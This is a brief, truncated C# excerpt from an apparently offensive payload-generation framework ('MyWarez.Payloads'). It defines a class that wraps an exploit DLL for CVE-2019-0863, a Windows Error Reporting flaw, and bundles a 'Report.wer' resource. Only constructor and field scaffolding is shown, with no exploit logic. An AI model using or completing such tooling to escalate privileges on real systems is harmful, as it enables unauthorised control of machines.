...
namespace MyWarez.Payloads
{
    ...
    public class CVE_2019_0863 : DynamicLinkLibrary
    {
        public CVE_2019_0863(Payload targetPathCppPayload) : base(Constants.DynamicFilePayloadDirectory + "DynamicLinkLibrary" + Path.DirectorySeparatorChar + typeof(CVE_2019_0863).Name)
        {
            if (!(targetPathCppPayload is IFilePayload))
                throw new ArgumentException();
            TargetPathCppPayload = targetPathCppPayload;
        }
        public override string Name { get; } = "CVE_2019_0863";
        private string ResourceFileName = "Resources.h";
        private IEnumerable<string> Resources = new List<string>() { "Report.wer" };
